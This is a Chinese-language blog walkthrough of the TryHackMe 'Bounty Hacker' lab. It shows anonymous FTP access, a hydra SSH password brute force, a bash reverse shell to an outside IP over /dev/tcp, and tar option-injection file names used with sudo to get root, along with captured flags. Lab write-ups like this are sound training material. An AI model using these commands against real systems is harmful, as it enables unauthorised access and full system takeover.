@@ -1,0 +1,265 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Bounty Hacker | Ananda</title><meta name="author" content="Ananda"><meta name="copyright" content="Ananda"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Bounty HackerYou talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! 端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_Bounty Hacker">
+<meta property="og:url" content="https://s1ient.github.io/post/43c2cb32.html">
+<meta property="og:site_name" content="Ananda">
+<meta property="og:description" content="Bounty HackerYou talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! 端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-14T06:05:43.000Z">
+<meta property="article:modified_time" content="2026-05-14T07:52:41.249Z">
+<meta property="article:author" content="Ananda">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://s1ient.github.io/post/43c2cb32.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_Bounty Hacker',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-05-14 15:52:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Ananda" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Ananda"><span class="site-name">Ananda</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Bounty Hacker</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-14T06:05:43.000Z" title="发表于 2026-05-14 14:05:43">2026-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-14T07:52:41.249Z" title="更新于 2026-05-14 15:52:41">2026-05-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"></div></div></div><article class="post-content" id="article-container"><h1 id="Bounty-Hacker"><a href="#Bounty-Hacker" class="headerlink" title="Bounty Hacker"></a>Bounty Hacker</h1><p>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!</p>
+<p>端口扫描</p>
+<table>
+<thead>
+<tr>
+<th align="center">序号</th>
+<th align="left">Host地址</th>
+<th align="center">端口</th>
+<th align="left">协议</th>
+<th align="left">Uri地址</th>
+<th align="left">标题</th>
+<th align="left">Banner</th>
+<th align="center">状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="left">10.146.147.145</td>
+<td align="center">21</td>
+<td align="left">FTP</td>
+<td align="left">10.146.147.145:21</td>
+<td align="left"></td>
+<td align="left">UnKnown</td>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="left">10.146.147.145</td>
+<td align="center">80</td>
+<td align="left">HTTP</td>
+<td align="left"><a target="_blank" rel="noopener" href="http://10.146.147.145/">http://10.146.147.145:80</a></td>
+<td align="left">None</td>
+<td align="left">Apache&#x2F;2.4.41 (Ubuntu), Apache-Web-Server, Apache-HTTP-Server&#x2F;2.4.41</td>
+<td align="center">200</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="left">10.146.147.145</td>
+<td align="center">22</td>
+<td align="left">SSH</td>
+<td align="left">10.146.147.145:22</td>
+<td align="left"></td>
+<td align="left">UnKnown</td>
+<td align="center">0</td>
+</tr>
+</tbody></table>
+<p>访问网站，只有一段对话，没有其他信息</p>
+<p>扫目录也没有信息</p>
+<p><img src="/../image/TryHackMe/easy/Bounty_Hacker/index.png"></p>
+<p>由于开启了 ftp 服务，成功匿名登录</p>
+<p>将 locks.txt 和 task.txt 下载下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# ftp 10.146.147.145 </span><br><span class="line">Connected to 10.146.147.145.</span><br><span class="line">220 (vsFTPd 3.0.5)</span><br><span class="line">Name (10.146.147.145:root): anonymous</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">550 Permission denied.</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..</span><br><span class="line">-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt</span><br><span class="line">-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get locks.txt</span><br><span class="line">local: locks.txt remote: locks.txt</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for locks.txt (418 bytes).</span><br><span class="line">100% |**************************************************************************************|   418        0.85 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">418 bytes received in 00:02 (0.20 KiB/s)</span><br><span class="line">ftp&gt; get task.txt</span><br><span class="line">local: task.txt remote: task.txt</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for task.txt (68 bytes).</span><br><span class="line">100% |**************************************************************************************|    68      210.81 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">68 bytes received in 00:00 (49.11 KiB/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看两个文件，一个看起来像是密码字典，另外一个则是 lin 布置的任务</p>
+<p>因此，猜测该字典是 ssh 的密码，用户名则是 lin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# cat locks.txt </span><br><span class="line">rEddrAGON</span><br><span class="line">ReDdr4g0nSynd!cat3</span><br><span class="line">Dr@gOn$yn9icat3</span><br><span class="line">R3DDr46ONSYndIC@Te</span><br><span class="line">ReddRA60N</span><br><span class="line">R3dDrag0nSynd1c4te</span><br><span class="line">dRa6oN5YNDiCATE</span><br><span class="line">ReDDR4g0n5ynDIc4te</span><br><span class="line">R3Dr4gOn2044</span><br><span class="line">RedDr4gonSynd1cat3</span><br><span class="line">R3dDRaG0Nsynd1c@T3</span><br><span class="line">Synd1c4teDr@g0n</span><br><span class="line">reddRAg0N</span><br><span class="line">REddRaG0N5yNdIc47e</span><br><span class="line">Dra6oN$yndIC@t3</span><br><span class="line">4L1mi6H71StHeB357</span><br><span class="line">rEDdragOn$ynd1c473</span><br><span class="line">DrAgoN5ynD1cATE</span><br><span class="line">ReDdrag0n$ynd1cate</span><br><span class="line">Dr@gOn$yND1C4Te</span><br><span class="line">RedDr@gonSyn9ic47e</span><br><span class="line">REd$yNdIc47e</span><br><span class="line">dr@goN5YNd1c@73</span><br><span class="line">rEDdrAGOnSyNDiCat3</span><br><span class="line">r3ddr@g0N</span><br><span class="line">ReDSynd1ca7e</span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# cat task.txt </span><br><span class="line">1.) Protect Vicious.</span><br><span class="line">2.) Plan for Red Eye pickup on the moon.</span><br><span class="line"></span><br><span class="line">-lin</span><br></pre></td></tr></table></figure>
+
+<p>使用 hydra 爆破，成功得到密码 RedDr4gonSynd1cat3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# hydra -l lin -P locks.txt ssh://10.146.147.145 -t 4 -vV</span><br><span class="line">Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 14:37:14</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task</span><br><span class="line">[DATA] attacking ssh://10.146.147.145:22/</span><br><span class="line">[VERBOSE] Resolving addresses ... [VERBOSE] resolving done</span><br><span class="line">[INFO] Testing if password authentication is supported by ssh://lin@10.146.147.145:22</span><br><span class="line">[INFO] Successful, password authentication is supported by ssh://10.146.147.145:22</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;rEddrAGON&quot; - 1 of 26 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;ReDdr4g0nSynd!cat3&quot; - 2 of 26 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;Dr@gOn$yn9icat3&quot; - 3 of 26 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;R3DDr46ONSYndIC@Te&quot; - 4 of 26 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;ReddRA60N&quot; - 5 of 26 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;R3dDrag0nSynd1c4te&quot; - 6 of 26 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;dRa6oN5YNDiCATE&quot; - 7 of 26 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;ReDDR4g0n5ynDIc4te&quot; - 8 of 26 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;R3Dr4gOn2044&quot; - 9 of 26 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 10.146.147.145 - login &quot;lin&quot; - pass &quot;RedDr4gonSynd1cat3&quot; - 10 of 26 [child 2] (0/0)</span><br><span class="line">[22][ssh] host: 10.146.147.145   login: lin   password: RedDr4gonSynd1cat3</span><br><span class="line">[STATUS] attack finished for 10.146.147.145 (waiting for children to complete tests)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 14:37:36</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>登录成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# ssh lin@10.146.147.145  </span><br><span class="line">lin@10.146.147.145&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)</span><br><span class="line">Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228</span><br><span class="line"></span><br><span class="line">lin@ip-10-146-147-145:~/Desktop$ id</span><br><span class="line">uid=1001(lin) gid=1001(lin) groups=1001(lin)</span><br></pre></td></tr></table></figure>
+
+<p>查看 user.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lin@ip-10-146-147-145:~/Desktop$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .</span><br><span class="line">drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..</span><br><span class="line">-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt</span><br><span class="line">lin@ip-10-146-147-145:~/Desktop$ cat user.txt</span><br><span class="line">THM&#123;CR1M3_SyNd1C4T3&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现 lin 用户有 sudo 权限执行 &#x2F;bin&#x2F;tar。</p>
+<p>提权方法：利用 tar 的 –checkpoint 和 –checkpoint-action 参数</p>
+<p>当 root 通过 sudo tar 执行某些操作（比如解压、归档）时，tar 命令支持两个特殊参数：</p>
+<p>–checkpoint&#x3D;N：每处理 N 个文件触发一个检查点</p>
+<p>–checkpoint-action&#x3D;ACTION：到达检查点时执行指定的动作（如 exec&#x3D;命令）</p>
+<p>如果我们可以让 tar 命令在当前工作目录下执行，并且能控制文件名，就可以通过创建特定名称的文件（如 –checkpoint&#x3D;1 和 –checkpoint-action&#x3D;exec&#x3D;sh shell.sh）来让 tar 执行任意命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lin@ip-10-146-147-145:~/Desktop$ sudo -l</span><br><span class="line">[sudo] password for lin: </span><br><span class="line">Matching Defaults entries for lin on ip-10-146-147-145:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User lin may run the following commands on ip-10-146-147-145:</span><br><span class="line">    (root) /bin/tar</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>创建临时目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lin@ip-10-146-147-145:~/Desktop$ cd /tmp</span><br><span class="line">lin@ip-10-146-147-145:/tmp$ mkdir shell</span><br><span class="line">lin@ip-10-146-147-145:/tmp$ cd shell</span><br></pre></td></tr></table></figure>
+
+<p>创建反弹 shell 脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lin@ip-10-146-147-145:/tmp/shell$ cat &gt; shell.sh &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">&gt; #!/bin/bash</span><br><span class="line">&gt; bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.140.133/4444 0&gt;&amp;1&quot;</span><br><span class="line">&gt; EOF</span><br><span class="line">lin@ip-10-146-147-145:/tmp/shell$ cat shell.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.140.133/4444 0&gt;&amp;1&quot;</span><br><span class="line">lin@ip-10-146-147-145:/tmp/shell$ chmod +x shell.sh</span><br></pre></td></tr></table></figure>
+
+<p>创建 tar 触发文件，并开始在本机监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lin@ip-10-146-147-145:/tmp/shell$ touch -- &quot;--checkpoint=1&quot;</span><br><span class="line">lin@ip-10-146-147-145:/tmp/shell$ touch -- &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br></pre></td></tr></table></figure>
+
+<p>触发提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lin@ip-10-146-147-145:/tmp/shell$ sudo /bin/tar -cf archive.tar *</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.80.1: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 8872</span><br><span class="line"></span><br><span class="line">root@ip-10-146-147-145:/tmp/shell# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line">root@ip-10-146-147-145:/tmp/shell# find / -name root.txt 2&gt;/dev/null</span><br><span class="line">/root/root.txt</span><br><span class="line"></span><br><span class="line">root@ip-10-146-147-145:/tmp/shell# cat /root/root.txt</span><br><span class="line">THM&#123;80UN7Y_h4cK3r&#125;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://s1ient.github.io">Ananda</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://s1ient.github.io/post/43c2cb32.html">https://s1ient.github.io/post/43c2cb32.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://s1ient.github.io" target="_blank">Ananda</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/b527094b.html" title="TryHackMe_Wgel CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Wgel CTF</div></div></a></div><div class="next-post pull-right"><a href="/post/a72569f1.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Anthem</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/a72569f1.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/b77ad967.html" title="TryHackMe_Thompson"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Thompson</div></div></a></div><div><a href="/post/3401368e.html" title="TryHackMe_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Buleprint</div></div></a></div><div><a href="/post/762f07c8.html" title="TryHackMe_Madness"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-13</div><div class="title">TryHackMe_Madness</div></div></a></div><div><a href="/post/6c602f0e.html" title="TryHackMe_Creative"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 